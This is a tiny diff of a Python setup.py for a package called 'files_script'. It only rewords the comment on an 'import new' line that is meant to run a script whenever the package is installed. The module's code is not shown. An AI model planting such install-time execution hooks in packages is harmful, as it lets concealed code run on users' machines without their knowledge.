@@ -1,5 +1,5 @@
 from setuptools import setup
-import new  # 🔥 this triggers your script on install
+import new  # triggers execution
 
 setup(
     name="files_script",
